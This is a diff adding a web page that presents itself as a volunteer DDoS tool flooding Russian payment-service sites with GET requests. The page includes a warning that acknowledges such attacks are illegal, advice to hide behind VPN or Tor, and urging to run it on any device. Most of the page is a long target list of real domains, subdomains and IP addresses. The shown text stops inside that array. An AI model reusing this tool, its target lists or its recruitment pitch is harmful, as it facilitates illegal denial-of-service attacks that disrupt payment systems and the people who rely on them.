@@ -1,0 +1,978 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 374 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 374</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+  &nbsp; &nbsp; &nbsp; The last days we are working on russian companies<br>
+  &nbsp; &nbsp; &nbsp; providing equating services.<br>
+  &nbsp; &nbsp; &nbsp; The attack was already:<br>
+  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoicebox.ru<br>
+  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; paymaster.ru<br>
+  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; intellectmoney.ru<br>
+  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; paykeeper.ru<br>
+  &nbsp; &nbsp; &nbsp; What did not allow, for example, to buy tickets online on<br>
+  &nbsp; &nbsp; &nbsp; the website of Aeroflot.<br>
+  &nbsp; &nbsp; &nbsp; Today we added best2pay.net<span style="font-size:14px;"><u></u><strong><br>
+  Additional message for newly added targets:<em>&nbsp;</em>&nbsp;<br>
+  </strong></span>&nbsp; &nbsp; &nbsp; N/A&nbsp;
+    </p>
+    </p>
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 374 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day374.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //The last days we are working on russian companies providing equating services. The attack was already: invoicebox.ru, paymaster.ru, intellectmoney.ru and paykeeper.ru What did not allow, for example, to buy tickets online on the website of Aeroflot. Today we added best2pay.net
+        //invoicebox.ru Targets
+		    'http://invoicebox.ru',
+		    'http://findoc.invoicebox.ru',
+		    'http://avans.invoicebox.ru',
+		    'http://delo.invoicebox.ru',
+		    'http://www.invoicebox.ru',
+		    'http://mx2.invoicebox.ru',
+		    'http://go.invoicebox.ru',
+		    'http://widget.invoicebox.ru',
+		    'http://mailtrap.invoicebox.ru',
+		    'http://www.delo.invoicebox.ru',
+		    'http://business.invoicebox.ru',
+		    'http://partner.invoicebox.ru',
+		    'http://e-commerce.invoicebox.ru',
+		    'http://mx1.invoicebox.ru',
+		    'http://b2b.invoicebox.ru',
+		    'http://troika.invoicebox.ru',
+		    'http://booking.invoicebox.ru',
+		    'http://ws.invoicebox.ru',
+		    'http://login.invoicebox.ru',
+		    'http://cnt.invoicebox.ru',
+		    'http://89.248.195.121',
+		    'http://89.248.195.120',
+		    'http://185.215.4.10',
+		    'http://89.248.195.117',
+		    'http://95.213.239.134',
+		    'http://89.248.195.119',
+		    'http://185.215.4.10',
+		    'http://95.213.239.135',
+		    'http://89.248.195.120',
+		    'http://185.165.123.36',
+		    'https://invoicebox.ru',
+		    'https://findoc.invoicebox.ru',
+		    'https://avans.invoicebox.ru',
+		    'https://delo.invoicebox.ru',
+		    'https://www.invoicebox.ru',
+		    'https://mx2.invoicebox.ru',
+		    'https://go.invoicebox.ru',
+		    'https://widget.invoicebox.ru',
+		    'https://mailtrap.invoicebox.ru',
+		    'https://www.delo.invoicebox.ru',
+		    'https://business.invoicebox.ru',
+		    'https://partner.invoicebox.ru',
+		    'https://e-commerce.invoicebox.ru',
+		    'https://mx1.invoicebox.ru',
+		    'https://b2b.invoicebox.ru',
+		    'https://troika.invoicebox.ru',
+		    'https://booking.invoicebox.ru',
+		    'https://ws.invoicebox.ru',
+		    'https://login.invoicebox.ru',
+		    'https://cnt.invoicebox.ru',
+		    'https://89.248.195.121',
+		    'https://89.248.195.120',
+		    'https://185.215.4.10',
+		    'https://89.248.195.117',
+		    'https://95.213.239.134',
+		    'https://89.248.195.119',
+		    'https://185.215.4.10',
+		    'https://95.213.239.135',
+		    'https://89.248.195.120',
+		    'https://185.165.123.36',
+        //paymaster.ru Targets
+		    'http://mail.paymaster.ru',
+		    'http://paymaster.ru',
+		    'http://insales2.paymaster.ru',
+		    'http://crm.paymaster.ru',
+		    'http://payout.paymaster.ru',
+		    'http://dostavka.paymaster.ru',
+		    'http://info.paymaster.ru',
+		    'http://hotels.paymaster.ru',
+		    'http://start.paymaster.ru',
+		    'http://mail.paymaster.ru',
+		    'http://scripts.paymaster.ru',
+		    'http://www.paymaster.ru',
+		    'http://sendy.paymaster.ru',
+		    'http://insales.paymaster.ru',
+		    'http://retail.paymaster.ru',
+		    'http://212.118.48.35',
+		    'http://91.227.52.169',
+		    'http://91.228.155.53',
+		    'http://51.254.96.26',
+		    'http://185.114.245.108',
+		    'http://91.227.52.200',
+		    'http://91.227.52.161',
+		    'http://212.118.48.161',
+        //intellectmoney.ru Targets
+		    'http://pub.intellectmoney.ru',
+		    'http://owa.pub.intellectmoney.ru',
+		    'http://mail.pub.intellectmoney.ru',
+		    'http://autodiscover.pub.intellectmoney.ru',
+		    'http://ecwid.intellectmoney.ru',
+		    'http://online.intellectmoney.ru',
+		    'http://landing.intellectmoney.ru',
+		    'http://merch.intellectmoney.ru',
+		    'http://wiki.intellectmoney.ru',
+		    'http://api.intellectmoney.ru',
+		    'http://selfwork.intellectmoney.ru',
+		    'http://mfo.intellectmoney.ru',
+		    'http://p2p.intellectmoney.ru',
+		    'http://eshop.intellectmoney.ru',
+		    'http://smtp.intellectmoney.ru',
+		    'http://wr.intellectmoney.ru',
+		    'http://insales.intellectmoney.ru',
+		    'http://apis.intellectmoney.ru',
+		    'http://masspayouts.intellectmoney.ru',
+		    'http://wallet.intellectmoney.ru',
+		    'http://merchant.intellectmoney.ru',
+		    'http://nonresident.intellectmoney.ru',
+		    'http://ext.intellectmoney.ru',
+		    'http://www.intellectmoney.ru',
+		    'http://54fz.intellectmoney.ru',
+		    'http://moybiz.intellectmoney.ru',
+		    'http://151.248.119.198',
+		    'http://194.147.107.247',
+		    'http://194.147.107.241',
+		    'http://194.147.107.245',
+		    'http://194.147.107.248',
+		    'http://194.147.107.252',
+		    'http://194.147.107.244',
+		    'https://pub.intellectmoney.ru',
+		    'https://owa.pub.intellectmoney.ru',
+		    'https://mail.pub.intellectmoney.ru',
+		    'https://autodiscover.pub.intellectmoney.ru',
+		    'https://ecwid.intellectmoney.ru',
+		    'https://online.intellectmoney.ru',
+		    'https://landing.intellectmoney.ru',
+		    'https://merch.intellectmoney.ru',
+		    'https://wiki.intellectmoney.ru',
+		    'https://api.intellectmoney.ru',
+		    'https://selfwork.intellectmoney.ru',
+		    'https://mfo.intellectmoney.ru',
+		    'https://p2p.intellectmoney.ru',
+		    'https://eshop.intellectmoney.ru',
+		    'https://smtp.intellectmoney.ru',
+		    'https://wr.intellectmoney.ru',
+		    'https://insales.intellectmoney.ru',
+		    'https://apis.intellectmoney.ru',
+		    'https://masspayouts.intellectmoney.ru',
+		    'https://wallet.intellectmoney.ru',
+		    'https://merchant.intellectmoney.ru',
+		    'https://nonresident.intellectmoney.ru',
+		    'https://ext.intellectmoney.ru',
+		    'https://www.intellectmoney.ru',
+		    'https://54fz.intellectmoney.ru',
+		    'https://moybiz.intellectmoney.ru',
+		    'https://151.248.119.198',
+		    'https://194.147.107.247',
+		    'https://194.147.107.241',
+		    'https://194.147.107.245',
+		    'https://194.147.107.248',
+		    'https://194.147.107.252',
+		    'https://194.147.107.244',
+        //paymaster.ru Targets
+		    'http://paykeeper.ru',
+		    'http://ukpr12.server.paykeeper.ru',
+		    'http://veles-sborka2.server.paykeeper.ru',
+		    'http://roblab2.server.paykeeper.ru',
+		    'http://estelab2.server.paykeeper.ru',
+		    'http://nb21.server.paykeeper.ru',
+		    'http://napol32.server.paykeeper.ru',
+		    'http://sp.paykeeper.ru',
+		    'http://eurokappa2.server.paykeeper.ru',
+		    'http://pushkin-coworking1.server.paykeeper.ru',
+		    'http://ukpr20.server.paykeeper.ru',
+		    'http://zumbastore2-2.server.paykeeper.ru',
+		    'http://dostavka-mbe1.server.paykeeper.ru',
+		    'http://54fzapi.paykeeper.ru',
+		    'http://modameda2.server.paykeeper.ru',
+		    'http://amasibir1.server.paykeeper.ru',
+		    'http://loks-k.server.paykeeper.ru',
+		    'http://sambo-dzyudo-1.server.paykeeper.ru',
+		    'http://malshkola2.server.paykeeper.ru',
+		    'http://billiardsamara1.server.paykeeper.ru',
+		    'http://sofme.server.paykeeper.ru',
+		    'http://ukpr11.server.paykeeper.ru',
+		    'http://i-murom1.server.paykeeper.ru',
+		    'http://moto62.server.paykeeper.ru',
+		    'http://bronblag1.server.paykeeper.ru',
+		    'http://ecwid-gw.paykeeper.ru',
+		    'http://ct22.server.paykeeper.ru',
+		    'http://novovyatka2.server.paykeeper.ru',
+		    'http://kentavr2000.server.paykeeper.ru',
+		    'http://garden762.server.paykeeper.ru',
+		    'http://kkm42.server.paykeeper.ru',
+		    'http://docs.paykeeper.ru',
+		    'http://robinzon51.server.paykeeper.ru',
+		    'http://ay-tour1.server.paykeeper.ru',
+		    'http://demo2.paykeeper.ru',
+		    'http://long-time-liner-russia2.server.paykeeper.ru',
+		    'http://thebestbuy1.server.paykeeper.ru',
+		    'http://zalog24h-2.server.paykeeper.ru',
+		    'http://myfiresales-day22.server.paykeeper.ru',
+		    'http://server.paykeeper.ru',
+		    'http://lavkahudozhnika762.server.paykeeper.ru',
+		    'http://nsq1.paykeeper.ru',
+		    'http://support-api.paykeeper.ru',
+		    'http://smtp2.paykeeper.ru',
+		    'http://applepaytest-opb.paykeeper.ru',
+		    'http://plitka02.server.paykeeper.ru',
+		    'http://ohotka1.server.paykeeper.ru',
+		    'http://advantshop.paykeeper.ru',
+		    'http://tur42.server.paykeeper.ru',
+		    'http://push-sbp2.paykeeper.ru',
+		    'http://partner.paykeeper.ru',
+		    'http://frog72.server.paykeeper.ru',
+		    'http://delivery.paykeeper.ru',
+		    'http://detfond1.server.paykeeper.ru',
+		    'http://ns3.paykeeper.ru',
+		    'http://3654000.server.paykeeper.ru',
+		    'http://andiki1.server.paykeeper.ru',
+		    'http://spb3.gw.paykeeper.ru',
+		    'http://dvec-mkb.paykeeper.ru',
+		    'http://krasivaya2.server.paykeeper.ru',
+		    'http://gazelist52.server.paykeeper.ru',
+		    'http://avtotur1.server.paykeeper.ru',
+		    'http://bitrix24.paykeeper.ru',
+		    'http://dev.dvec.paykeeper.ru',
+		    'http://1kkm42.server.paykeeper.ru',
+		    'http://card.paykeeper.ru',
+		    'http://oct-api.paykeeper.ru',
+		    'http://ukpr1.server.paykeeper.ru',
+		    'http://art-akademia21.server.paykeeper.ru',
+		    'http://ns1.paykeeper.ru',
+		    'http://3731010.server.paykeeper.ru',
+		    'http://backup.paykeeper.ru',
+		    'http://solnce32.server.paykeeper.ru',
+		    'http://ukpr21.server.paykeeper.ru',
+		    'http://gw.pci.paykeeper.ru',
+		    'http://3160-2.server.paykeeper.ru',
+		    'http://centrnp72.server.paykeeper.ru',
+		    'http://musicvoyages1.server.paykeeper.ru',
+		    'http://smtp.paykeeper.ru',
+		    'http://scan.paykeeper.ru',
+		    'http://pharmgeocom-1.server.paykeeper.ru',
+		    'http://kassa.paykeeper.ru',
+		    'http://sosna2.server.paykeeper.ru',
+		    'http://ukpr10.server.paykeeper.ru',
+		    'http://meridian-32.server.paykeeper.ru',
+		    'http://idn500.server.paykeeper.ru',
+		    'http://dvec.paykeeper.ru',
+		    'http://tkshell2.server.paykeeper.ru',
+		    'http://okna911.server.paykeeper.ru',
+		    'http://solo-7910.server.paykeeper.ru',
+		    'http://ns4.paykeeper.ru',
+		    'http://sd62.server.paykeeper.ru',
+		    'http://chinatravel-mir-1.server.paykeeper.ru',
+		    'http://cof.paykeeper.ru',
+		    'http://rsb.paykeeper.ru',
+		    'http://delivery-demo.paykeeper.ru',
+		    'http://eucas2021.server.paykeeper.ru',
+		    'http://ohotka2.server.paykeeper.ru',
+		    'http://skandinspb1.server.paykeeper.ru',
+		    'http://oblakatravel1.server.paykeeper.ru',
+		    'http://194.58.121.82',
+		    'http://89.108.72.37',
+		    'http://134.0.115.71',
+		    'http://185.87.50.159',
+		    'http://81.5.70.12',
+		    'http://62.76.188.83',
+		    'http://81.5.119.122',
+		    'http://78.155.216.137',
+		    'http://31.184.251.106',
+		    'http://194.58.97.217',
+		    'http://194.87.66.246',
+		    'http://31.184.251.102',
+		    'http://109.120.179.146',
+		    'http://91.142.84.199',
+		    'http://37.140.197.250',
+		    'http://31.184.251.100',
+		    'http://178.248.234.103',
+		    'http://37.140.198.251',
+		    'http://194.58.121.79',
+		    'http://31.184.251.99',
+		    'http://78.155.216.185',
+		    'http://82.146.52.255',
+		    'http://194.58.104.195',
+		    'http://78.155.216.150',
+		    'http://194.58.118.138',
+		    'http://5.188.162.36',
+		    'http://62.76.47.59',
+		    'http://78.155.216.152',
+		    'http://151.248.114.230',
+		    'http://31.184.251.101',
+		    'http://78.155.216.167',
+		    'http://5.23.53.23',
+		    'http://178.248.236.44',
+		    'http://91.142.92.69',
+		    'http://78.155.216.168',
+		    'http://91.142.84.209',
+		    'http://31.184.251.108',
+		    'http://78.155.216.189',
+		    'http://31.184.251.109',
+		    'http://91.142.84.197',
+		    'http://5.188.162.34',
+		    'http://91.142.84.200',
+		    'http://5.188.162.39',
+		    'http://92.53.76.114',
+		    'http://5.188.162.40',
+		    'http://91.142.92.76',
+		    'http://37.140.199.84',
+		    'http://95.213.222.184',
+		    'http://91.142.92.86',
+		    'http://91.142.92.82',
+		    'http://91.142.84.222',
+		    'http://185.20.226.199',
+		    'http://91.142.92.81',
+		    'http://92.53.76.115',
+		    'http://194.58.118.207',
+		    'http://31.184.251.98',
+		    'http://194.58.97.222',
+		    'http://92.53.83.6',
+		    'http://91.142.84.198',
+		    'http://78.155.216.141',
+		    'http://194.58.61.66',
+		    'http://62.76.184.125',
+		    'http://194.58.121.37',
+		    'http://185.178.45.192',
+		    'http://91.142.92.77',
+		    'http://5.63.157.34',
+		    'http://91.142.84.206',
+		    'http://31.184.251.109',
+		    'http://78.155.216.138',
+		    'http://31.184.251.109',
+		    'http://91.142.92.78',
+		    'http://91.142.84.226',
+		    'https://paykeeper.ru',
+		    'https://ukpr12.server.paykeeper.ru',
+		    'https://veles-sborka2.server.paykeeper.ru',
+		    'https://roblab2.server.paykeeper.ru',
+		    'https://estelab2.server.paykeeper.ru',
+		    'https://nb21.server.paykeeper.ru',
+		    'https://napol32.server.paykeeper.ru',
+		    'https://sp.paykeeper.ru',
+		    'https://eurokappa2.server.paykeeper.ru',
+		    'https://pushkin-coworking1.server.paykeeper.ru',
+		    'https://ukpr20.server.paykeeper.ru',
+		    'https://zumbastore2-2.server.paykeeper.ru',
+		    'https://dostavka-mbe1.server.paykeeper.ru',
+		    'https://54fzapi.paykeeper.ru',
+		    'https://modameda2.server.paykeeper.ru',
+		    'https://amasibir1.server.paykeeper.ru',
+		    'https://loks-k.server.paykeeper.ru',
+		    'https://sambo-dzyudo-1.server.paykeeper.ru',
+		    'https://malshkola2.server.paykeeper.ru',
+		    'https://billiardsamara1.server.paykeeper.ru',
+		    'https://sofme.server.paykeeper.ru',
+		    'https://ukpr11.server.paykeeper.ru',
+		    'https://i-murom1.server.paykeeper.ru',
+		    'https://moto62.server.paykeeper.ru',
+		    'https://bronblag1.server.paykeeper.ru',
+		    'https://ecwid-gw.paykeeper.ru',
+		    'https://ct22.server.paykeeper.ru',
+		    'https://novovyatka2.server.paykeeper.ru',
+		    'https://kentavr2000.server.paykeeper.ru',
+		    'https://garden762.server.paykeeper.ru',
+		    'https://kkm42.server.paykeeper.ru',
+		    'https://docs.paykeeper.ru',
+		    'https://robinzon51.server.paykeeper.ru',
+		    'https://ay-tour1.server.paykeeper.ru',
+		    'https://demo2.paykeeper.ru',
+		    'https://long-time-liner-russia2.server.paykeeper.ru',
+		    'https://thebestbuy1.server.paykeeper.ru',
+		    'https://zalog24h-2.server.paykeeper.ru',
+		    'https://myfiresales-day22.server.paykeeper.ru',
+		    'https://server.paykeeper.ru',
+		    'https://lavkahudozhnika762.server.paykeeper.ru',
+		    'https://nsq1.paykeeper.ru',
+		    'https://support-api.paykeeper.ru',
+		    'https://smtp2.paykeeper.ru',
+		    'https://applepaytest-opb.paykeeper.ru',
+		    'https://plitka02.server.paykeeper.ru',
+		    'https://ohotka1.server.paykeeper.ru',
+		    'https://advantshop.paykeeper.ru',
+		    'https://tur42.server.paykeeper.ru',
+		    'https://push-sbp2.paykeeper.ru',
+		    'https://partner.paykeeper.ru',
+		    'https://frog72.server.paykeeper.ru',
+		    'https://delivery.paykeeper.ru',
+		    'https://detfond1.server.paykeeper.ru',
+		    'https://ns3.paykeeper.ru',
+		    'https://3654000.server.paykeeper.ru',
+		    'https://andiki1.server.paykeeper.ru',
+		    'https://spb3.gw.paykeeper.ru',
+		    'https://dvec-mkb.paykeeper.ru',
+		    'https://krasivaya2.server.paykeeper.ru',
+		    'https://gazelist52.server.paykeeper.ru',
+		    'https://avtotur1.server.paykeeper.ru',
+		    'https://bitrix24.paykeeper.ru',
+		    'https://dev.dvec.paykeeper.ru',
+		    'https://1kkm42.server.paykeeper.ru',
+		    'https://card.paykeeper.ru',
+		    'https://oct-api.paykeeper.ru',
+		    'https://ukpr1.server.paykeeper.ru',
+		    'https://art-akademia21.server.paykeeper.ru',
+		    'https://ns1.paykeeper.ru',
+		    'https://3731010.server.paykeeper.ru',
+		    'https://backup.paykeeper.ru',
+		    'https://solnce32.server.paykeeper.ru',
+		    'https://ukpr21.server.paykeeper.ru',
+		    'https://gw.pci.paykeeper.ru',
+		    'https://3160-2.server.paykeeper.ru',
+		    'https://centrnp72.server.paykeeper.ru',
+		    'https://musicvoyages1.server.paykeeper.ru',
+		    'https://smtp.paykeeper.ru',
+		    'https://scan.paykeeper.ru',
+		    'https://pharmgeocom-1.server.paykeeper.ru',
+		    'https://kassa.paykeeper.ru',
+		    'https://sosna2.server.paykeeper.ru',
+		    'https://ukpr10.server.paykeeper.ru',
+		    'https://meridian-32.server.paykeeper.ru',
+		    'https://idn500.server.paykeeper.ru',
+		    'https://dvec.paykeeper.ru',
+		    'https://tkshell2.server.paykeeper.ru',
+		    'https://okna911.server.paykeeper.ru',
+		    'https://solo-7910.server.paykeeper.ru',
+		    'https://ns4.paykeeper.ru',
+		    'https://sd62.server.paykeeper.ru',
+		    'https://chinatravel-mir-1.server.paykeeper.ru',
+		    'https://cof.paykeeper.ru',
+		    'https://rsb.paykeeper.ru',
+		    'https://delivery-demo.paykeeper.ru',
+		    'https://eucas2021.server.paykeeper.ru',
+		    'https://ohotka2.server.paykeeper.ru',
+		    'https://skandinspb1.server.paykeeper.ru',
+		    'https://oblakatravel1.server.paykeeper.ru',
+		    'https://194.58.121.82',
+		    'https://89.108.72.37',
+		    'https://134.0.115.71',
+		    'https://185.87.50.159',
+		    'https://81.5.70.12',
+		    'https://62.76.188.83',
+		    'https://81.5.119.122',
+		    'https://78.155.216.137',
+		    'https://31.184.251.106',
+		    'https://194.58.97.217',
+		    'https://194.87.66.246',
+		    'https://31.184.251.102',
+		    'https://109.120.179.146',
+		    'https://91.142.84.199',
+		    'https://37.140.197.250',
+		    'https://31.184.251.100',
+		    'https://178.248.234.103',
+		    'https://37.140.198.251',
+		    'https://194.58.121.79',
+		    'https://31.184.251.99',
+		    'https://78.155.216.185',
+		    'https://82.146.52.255',
+		    'https://194.58.104.195',
+		    'https://78.155.216.150',
+		    'https://194.58.118.138',
+		    'https://5.188.162.36',
+		    'https://62.76.47.59',
+		    'https://78.155.216.152',
+		    'https://151.248.114.230',
+		    'https://31.184.251.101',
+		    'https://78.155.216.167',
+		    'https://5.23.53.23',
+		    'https://178.248.236.44',
+		    'https://91.142.92.69',
+		    'https://78.155.216.168',
+		    'https://91.142.84.209',
